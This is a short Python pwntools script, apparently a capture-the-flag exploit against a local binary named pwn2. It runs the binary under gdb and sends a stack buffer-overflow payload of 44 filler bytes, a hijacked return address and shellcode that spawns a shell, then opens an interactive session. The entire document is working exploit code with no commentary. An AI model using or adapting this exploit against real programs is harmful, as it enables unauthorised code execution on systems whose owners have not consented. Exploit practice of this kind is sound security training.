from pwn import *

with gdb.debug("./pwn2") as r:
    inp=b'A'*44+p32(0x08048544)+asm(shellcraft.sh())
    r.sendline(inp)
    r.interactive()